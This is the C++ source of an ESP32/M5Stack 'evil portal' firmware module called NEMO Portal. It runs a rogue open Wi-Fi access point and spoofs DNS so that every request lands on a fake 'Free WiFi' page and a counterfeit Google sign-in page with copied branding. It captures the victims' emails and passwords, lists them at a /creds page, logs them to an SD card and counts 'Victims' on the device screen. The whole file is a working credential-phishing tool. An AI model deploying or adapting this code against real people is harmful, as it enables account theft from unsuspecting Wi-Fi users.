// Borrowed from https://github.com/marivaaldo/evil-portal-m5stack/ which
// has iterative iprovements over my own stand-alone M5Stick Evil Portal.
// Retaining the Portuguese translations since this project has a large
// fan base in Brazil. Shouts to CyberJulio as well.

#define DEFAULT_AP_SSID_NAME "BATC4VE"
#define SD_CREDS_PATH "/nemo-portal-creds.txt"

#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) &&                      \
    defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
#error                                                                         \
    "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT or LANGUAGE_FR_FR"
#endif

#if defined(LANGUAGE_EN_US)
#define LOGIN_TITLE "Sign in"
#define LOGIN_SUBTITLE "Sign In With Google"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Please log in to browse securely."
#define LOGIN_BUTTON "Next"
#define LOGIN_AFTER_MESSAGE                                                    \
  "Please wait a few minutes. Soon you will be able to access the internet."
#define TYPE_SSID_TEXT                                                         \
  "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType "  \
  "the SSID\nPress Enter to Confirm\n\n"
#elif defined(LANGUAGE_PT_BR)
#define LOGIN_TITLE "Fazer login"
#define LOGIN_SUBTITLE "Use sua Conta do Google"
#define LOGIN_EMAIL_PLACEHOLDER "E-mail"
#define LOGIN_PASSWORD_PLACEHOLDER "Senha"
#define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
#define LOGIN_BUTTON "Avançar"
#define LOGIN_AFTER_MESSAGE "Fazendo login..."
#define TYPE_SSID_TEXT                                                         \
  "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter "  \
  "para Confirmar\n\n"
#elif defined(LANGUAGE_IT_IT)
#define LOGIN_TITLE "Accedi"
#define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
#define LOGIN_BUTTON "Avanti"
#define LOGIN_AFTER_MESSAGE                                                    \
  "Per favore attendi qualche minuto. Presto sarai in grado di accedere a "    \
  "Internet."
#define TYPE_SSID_TEXT                                                         \
  "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi " \
  "l'SSID\nPremi Invio per Confermare\n\n"
#elif defined(LANGUAGE_FR_FR)
#define LOGIN_TITLE "Connexion"
#define LOGIN_SUBTITLE "Utiliser votre compte Google"
#define LOGIN_EMAIL_PLACEHOLDER "Adresse e-mail"
#define LOGIN_PASSWORD_PLACEHOLDER "Mot de passe"
#define LOGIN_MESSAGE                                                          \
  "Merci de vous connecter pour obtenir une navigation sécurisée."
#define LOGIN_BUTTON "Suivant"
#define LOGIN_AFTER_MESSAGE                                                    \
  "Connexion en cours. Merci de patienter quelques instants."
#define TYPE_SSID_TEXT                                                         \
  "La longueur du SSID doit être entre 2 et 32\nInvalide: "                    \
  "?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
#endif

// Forward declarations and includes needed for portal functionality
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <IPAddress.h>

// External variables from main file
extern bool isSwitching;
extern int current_proc;

int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = 0;
String capturedCredentialsHtml = "";

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress AP_GATEWAY(172, 0, 0, 1); // Gateway
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

void setSSID(String ssid) {
#if defined USE_EEPROM
  Serial.printf("Writing %d bytes of SSID to EEPROM\n", ssid.length());
  for (int i = 0; i < ssid.length(); i++) {
    EEPROM.write(i + apSsidOffset, ssid[i]);
    Serial.printf("%d:%d ", i + apSsidOffset, ssid[i]);
  }
  EEPROM.write(apSsidOffset + ssid.length(), 0);
  EEPROM.commit();
  Serial.println("\ndone.");
#endif
  apSsidName = ssid;
  return;
}

#ifdef CARDPUTER
void confirmOrTypeSSID() {
  DISP.fillScreen(BGCOLOR);
  DISP.setSwapBytes(true);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("  WiFi SSID  ");
  DISP.setTextSize(TINY_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.println(TYPE_SSID_TEXT);
  DISP.setTextSize(SMALL_TEXT);
  uint8_t ssidTextCursorY = DISP.getCursorY();
  String currentSSID = String(apSsidName.c_str());
  DISP.printf("%s", currentSSID.c_str());
  bool ssid_ok = false;

  while (!ssid_ok) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if (status.del) {
        currentSSID.remove(currentSSID.length() - 1);
      }
      if (status.enter) {
        ssid_ok = true;
      }
      if (currentSSID.length() >= 32) {
        continue;
      }
      for (auto i : status.word) {
        if (i != '?' && i != '$' && i != '\"' && i != '[' && i != '\\' &&
            i != ']' && i != '+') {
          currentSSID += i;
        }
      }
      DISP.fillRect(0, ssidTextCursorY, DISP.width(),
                    DISP.width() - ssidTextCursorY, BLACK);
      DISP.setCursor(0, ssidTextCursorY);
      DISP.printf("%s", currentSSID.c_str());
    }
  }

  if (currentSSID != apSsidName && currentSSID.length() > 2) {
    setSSID(currentSSID);
  }
}
#endif

void setupWiFi() {
  Serial.println("Initializing WiFi");
#if defined(CARDPUTER)
  confirmOrTypeSSID();
#endif // Cardputer
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSsidName);
}

void getSSID() {
  String ssid = "";
#if defined USE_EEPROM
  if (EEPROM.read(apSsidOffset) < 32 || EEPROM.read(apSsidOffset) > 254) {
    Serial.println("SSID EEPROM Corrupt or Uninitialized. Using Defaults.");
    apSsidName = DEFAULT_AP_SSID_NAME;
    return;
  }
  for (int i = apSsidOffset; i < apSsidOffset + apSsidMaxLen; i++) {
    int ebyte = EEPROM.read(i);
    Serial.printf("%d:%d ", i, ebyte);
    if (ebyte < 32 || ebyte > 254) {
      Serial.println("SSID: " + ssid);
      apSsidName = ssid;
      return;
    }
    ssid += char(ebyte);
  }
#else
  apSsidName = DEFAULT_AP_SSID_NAME;
#endif
  return;
}

void printHomeToScreen() {
  DISP.fillScreen(BGCOLOR);
  DISP.setSwapBytes(true);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" NEMO PORTAL ");
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf("%s\n\n", apSsidName.c_str());
  DISP.print("WiFi IP: ");
  DISP.println(AP_GATEWAY);
  DISP.println("Paths: /creds /ssid");
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.printf("Victims: %-4d\n", totalCapturedCredentials);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

String getInputValue(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String getHtmlContents(String body) {
  String html =
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "  <title>" +
      apSsidName +
      "</title>"
      "  <meta charset='UTF-8'>"
      "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
      "  <style>"
      "    * { box-sizing: border-box; margin: 0; padding: 0; }"
      "    body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; "
      "background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); "
      "min-height: 100vh; display: flex; align-items: center; justify-content: "
      "center; padding: 20px; }"
      "    .container { max-width: 450px; width: 100%; }"
      "    .wifi-icon { text-align: center; margin-bottom: 20px; }"
      "    .wifi-icon svg { width: 80px; height: 80px; fill: white; }"
      "    .form-container { background: #FFFFFF; border-radius: 12px; "
      "padding: 40px 35px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }"
      "    .welcome-title { color: #202124; font-size: 28px; font-weight: 400; "
      "text-align: center; margin-bottom: 8px; }"
      "    .welcome-subtitle { color: #5f6368; font-size: 16px; text-align: "
      "center; margin-bottom: 32px; }"
      "    .divider { display: flex; align-items: center; margin: 24px 0; "
      "color: #5f6368; font-size: 14px; }"
      "    .divider::before, .divider::after { content: ''; flex: 1; "
      "border-bottom: 1px solid #dadce0; }"
      "    .divider span { padding: 0 16px; }"
      "    .input-field { width: 100%; padding: 13px 15px; border: 1px solid "
      "#dadce0; border-radius: 4px; margin-bottom: 16px; font-size: 16px; "
      "transition: border-color 0.2s; }"
      "    .input-field:focus { outline: none; border-color: #1a73e8; "
      "border-width: 2px; }"
      "    .submit-btn { width: 100%; background: #1a73e8; color: white; "
      "border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; "
      "font-weight: 500; cursor: pointer; transition: background 0.2s; }"
      "    .submit-btn:hover { background: #1557b0; box-shadow: 0 2px 4px "
      "rgba(0,0,0,0.1); }"
      "    .google-btn { width: 100%; background: white; color: #3c4043; "
      "border: 1px solid #dadce0; padding: 12px 24px; border-radius: 4px; "
      "font-size: 14px; font-weight: 500; cursor: pointer; display: flex; "
      "align-items: center; justify-content: center; gap: 12px; transition: "
      "box-shadow 0.2s; text-decoration: none; }"
      "    .google-btn:hover { box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
      "    .google-btn svg { width: 18px; height: 18px; }"
      "    .security-note { color: #5f6368; font-size: 12px; text-align: "
      "center; margin-top: 24px; line-height: 1.5; }"
      "    .lock-icon { display: inline-block; margin-right: 4px; }"
      "    @media screen and (min-width: 768px) { .form-container { padding: "
      "48px 40px; } }"
      "  </style>"
      "</head>"
      "<body>"
      "  <div class='container'>"
      "    <div class='wifi-icon'>"
      "      <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path "
      "d='M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.07 2.93 1 9zm8 "
      "8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 "
      "0l2-2C15.14 9.14 8.87 9.14 5 13z'/></svg>"
      "    </div>"
      "    <div class='form-container'>" +
      body +
      "    </div>"
      "  </div>"
      "</body>"
      "</html>";
  return html;
}

String getGoogleSignInContents(String body) {
  String html =
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "  <title>Sign in - Google Accounts</title>"
      "  <meta charset='UTF-8'>"
      "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
      "  <style>"
      "    * { box-sizing: border-box; margin: 0; padding: 0; }"
      "    body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; "
      "background: #fff; min-height: 100vh; display: flex; align-items: "
      "center; justify-content: center; padding: 20px; }"
      "    .container { max-width: 450px; width: 100%; }"
      "    .logo-container { text-align: center; margin-bottom: 32px; }"
      "    .logo-container svg { width: 75px; height: 24px; }"
      "    .form-container { padding: 0 40px; }"
      "    .title { color: #202124; font-size: 24px; font-weight: 400; "
      "text-align: center; margin-bottom: 8px; }"
      "    .subtitle { color: #202124; font-size: 16px; text-align: center; "
      "margin-bottom: 32px; }"
      "    .input-field { width: 100%; padding: 13px 15px; border: 1px solid "
      "#dadce0; border-radius: 4px; margin-bottom: 24px; font-size: 16px; "
      "transition: border-color 0.2s; }"
      "    .input-field:focus { outline: none; border-color: #1a73e8; "
      "border-width: 2px; }"
      "    .forgot-email { color: #1a73e8; font-size: 14px; text-decoration: "
      "none; margin-bottom: 24px; display: block; }"
      "    .forgot-email:hover { text-decoration: underline; }"
      "    .submit-btn { width: 100%; background: #1a73e8; color: white; "
      "border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; "
      "font-weight: 500; cursor: pointer; transition: background 0.2s; }"
      "    .submit-btn:hover { background: #1557b0; box-shadow: 0 2px 4px "
      "rgba(0,0,0,0.1); }"
      "    .create-account { color: #1a73e8; font-size: 14px; text-decoration: "
      "none; margin-top: 24px; display: block; text-align: center; }"
      "    .create-account:hover { text-decoration: underline; }"
      "    .footer { text-align: center; margin-top: 40px; padding-top: 24px; "
      "border-top: 1px solid #dadce0; }"
      "    .footer-links { display: flex; justify-content: center; gap: 24px; "
      "flex-wrap: wrap; }"
      "    .footer-links a { color: #5f6368; font-size: 12px; text-decoration: "
      "none; }"
      "    .footer-links a:hover { text-decoration: underline; }"
      "    .help-text { color: #5f6368; font-size: 14px; margin-bottom: 16px; }"
      "  </style>"
      "</head>"
      "<body>"
      "  <div class='container'>"
      "    <div class='logo-container'>"
      "      <svg viewBox='0 0 75 24' width='75' height='24' "
      "xmlns='http://www.w3.org/2000/svg' aria-hidden='true'><g "
      "id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 "
      "0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-"
      "3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 "
      "4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 "
      "1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 "
      "1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' "
      "d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path "
      "fill='#4285f4' d='M54.152 "
      "8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 "
      "5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 "
      "3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 "
      "0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 "
      "5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 "
      "0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 "
      "1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g "
      "id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 "
      "2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 "
      "5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 "
      "0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 "
      "3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path "
      "fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 "
      "2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 "
      "0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 "
      "0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 "
      "3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 "
      "14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 "
      "1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 "
      "2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 "
      "6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 "
      "3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 "
      "4.69-1.856z'></path></g></svg>"
      "    </div>"
      "    <div class='form-container'>" +
      body +
      "    </div>"
      "    <div class='footer'>"
      "      <div class='footer-links'>"
      "        <a href='#'>Help</a>"
      "        <a href='#'>Privacy</a>"
      "        <a href='#'>Terms</a>"
      "      </div>"
      "    </div>"
      "  </div>"
      "</body>"
      "</html>";
  return html;
}

String creds_GET() {
  return getHtmlContents(
      "<ol>" + capturedCredentialsHtml +
      "</ol><br><center><p><a style=\"color:blue\" href=/>Back to "
      "Index</a></p><p><a style=\"color:blue\" href=/clear>Clear "
      "passwords</a></p></center>");
}

String index_GET() {
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginMessage = String(LOGIN_MESSAGE);

  String body =
      "<h1 class='welcome-title'>Welcome to Free WiFi</h1>"
      "<p class='welcome-subtitle'>Connect to access high-speed internet</p>"
      "<form action='/google-signin' method='get' id='email-form'>"
      "  <input name='email' class='input-field' type='email' placeholder='" +
      loginEmailPlaceholder +
      "' autocomplete='email'>"
      "  <button class='submit-btn' type='submit'>Continue</button>"
      "</form>"
      "<div class='divider'><span>or</span></div>"
      "<a href='/google-signin' class='google-btn'>"
      "  <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path "
      "fill='#4285F4' d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 "
      "1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 "
      "3.28-8.09z'/><path fill='#34A853' d='M12 23c2.97 0 5.46-.98 "
      "7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 "
      "0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z'/><path "
      "fill='#FBBC05' d='M5.84 "
      "14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 "
      "10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z'/><path fill='#EA4335' "
      "d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 "
      "7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z'/></svg>"
      "  Sign in with Google"
      "</a>"
      "<p class='security-note'><span class='lock-icon'>🔒</span>" +
      loginMessage + "</p>";

  return getHtmlContents(body);
}

String googleSignIn_GET() {
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
  String loginButton = String(LOGIN_BUTTON);

  String emailValue = "";
  if (webServer.hasArg("email")) {
    emailValue = " value='" + getInputValue("email") + "'";
  }

  String body =
      "<h1 class='title'>Sign in</h1>"
      "<p class='subtitle'>Use your Google Account</p>"
      "<form action='/post' method='post' id='google-login-form' "
      "autocomplete='on' data-domain='google.com'>"
      "  <input name='identifier' id='identifier' class='input-field' "
      "type='email' placeholder='" +
      loginEmailPlaceholder + "'" + emailValue +
      " required autocomplete='email' aria-label='Email or phone'>"
      "  <a href='#' class='forgot-email'>Forgot email?</a>"
      "  <p class='help-text'>Not your computer? Use Guest mode to browse "
      "privately.</p>"
      "  <input type='hidden' name='google.com' value=''>"
      "  <input type='hidden' name='origin' value='https://google.com'>"
      "  <input type='hidden' name='site' value='google.com'>"
      "  <input name='password' id='password' class='input-field' "
      "type='password' placeholder='" +
      loginPasswordPlaceholder +
      "' required autocomplete='password' data-lpignore='false' "
      "data-form-type='password' data-domain='google.com' aria-label='Enter "
      "your password'>"
      "  <a href='#' class='forgot-email'>Forgot password?</a>"
      "  <input type='hidden' name='email' value=''>"
      "  <input type='hidden' name='Passwd' id='Passwd' value=''>"
      "  <button class='submit-btn' type='submit'>" +
      loginButton +
      "</button>"
      "</form>"
      "<a href='#' class='create-account'>Create account</a>"
      "<script>"
      "  "
      "document.getElementById('google-login-form').addEventListener('submit', "
      "function(e) {"
      "    var identifier = document.getElementById('identifier').value;"
      "    var passwd = document.getElementById('password').value;"
      "    document.querySelector('input[name=\"email\"]').value = identifier;"
      "    document.querySelector('input[name=\"password\"]').value = passwd;"
      "    document.getElementById('Passwd').value = passwd;"
      "  });"
      "</script>";

  return getGoogleSignInContents(body);
}

String index_POST() {
  String email = getInputValue("email");
  String password = getInputValue("password");
  // Fallback to Google field names if standard names are empty
  if (email.length() == 0) {
    email = getInputValue("identifier");
  }
  if (password.length() == 0) {
    password = getInputValue("Passwd");
  }
  capturedCredentialsHtml = "<li>Email: <b>" + email +
                            "</b></br>Password: <b>" + password + "</b></li>" +
                            capturedCredentialsHtml;

#if defined(SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
#endif
  return getHtmlContents(LOGIN_AFTER_MESSAGE);
}

String ssid_GET() {
  return getHtmlContents(
      "<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' "
      "id='login-form'><input name='ssid' class='input-field' type='text' "
      "placeholder='" +
      apSsidName +
      "' required><button id=submitbtn class=submit-btn "
      "type=submit>Apply</button></div></form>");
}

String ssid_POST() {
  String ssid = getInputValue("ssid");
  Serial.println("SSID Has been changed to " + ssid);
  setSSID(ssid);
  printHomeToScreen();
  return getHtmlContents(
      "NEMO Portal shutting down and restarting with SSID <b>" + ssid +
      "</b>. Please reconnect.");
}

String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  totalCapturedCredentials = 0;
  return getHtmlContents(
      "<div><p>The credentials list has been reset.</div></p><center><a "
      "style=\"color:blue\" href=/creds>Back to "
      "capturedCredentialsHtml</a></center><center><a style=\"color:blue\" "
      "href=/>Back to Index</a></center>");
}

#if defined(M5LED)
void blinkLed() {
  int count = 0;
  while (count < 5) {
    digitalWrite(IRLED, M5LED_ON);
    delay(500);
    digitalWrite(IRLED, M5LED_OFF);
    delay(500);
    count = count + 1;
  }
}
#endif

void shutdownWebServer() {
  Serial.println("Stopping DNS");
  dnsServer.stop();
  Serial.println("Closing Webserver");
  webServer.close();
  Serial.println("Stopping Webserver");
  webServer.stop();
  Serial.println("Setting WiFi to STA mode");
  WiFi.mode(WIFI_MODE_STA);
  Serial.println("Resetting SSID");
  getSSID();
}

void setupWebServer() {
  Serial.println("Starting DNS");
  dnsServer.start(DNS_PORT, "*", AP_GATEWAY); // DNS spoofing (Only HTTP)
  Serial.println("Setting up Webserver");
  webServer.on("/post", [&]() {
    totalCapturedCredentials = totalCapturedCredentials + 1;
    webServer.send(HTTP_CODE, "text/html", index_POST());
#if defined(STICK_C_PLUS)
    SPEAKER.tone(4000);
    delay(50);
    SPEAKER.mute();
#elif defined(CARDPUTER)
    // SPEAKER.tone(4000, 50);     //Silent mode, just in case
#endif
    DISP.print("Victim Login");
#if defined(M5LED)
    blinkLed();
#endif
  });

  Serial.println("Registering /creds");
  webServer.on("/creds",
               [&]() { webServer.send(HTTP_CODE, "text/html", creds_GET()); });
  Serial.println("Registering /clear");
  webServer.on("/clear",
               [&]() { webServer.send(HTTP_CODE, "text/html", clear_GET()); });
  Serial.println("Registering /ssid");
  webServer.on("/ssid",
               [&]() { webServer.send(HTTP_CODE, "text/html", ssid_GET()); });
  Serial.println("Registering /postssid");
  webServer.on("/postssid", [&]() {
    webServer.send(HTTP_CODE, "text/html", ssid_POST());
    shutdownWebServer();
    isSwitching = true;
    current_proc = 19;
  });
  Serial.println("Registering /google-signin");
  webServer.on("/google-signin", [&]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", googleSignIn_GET());
  });
  Serial.println("Registering /*");
  webServer.onNotFound([&]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index_GET());
  });
  Serial.println("Starting Webserver");
  webServer.begin();
}
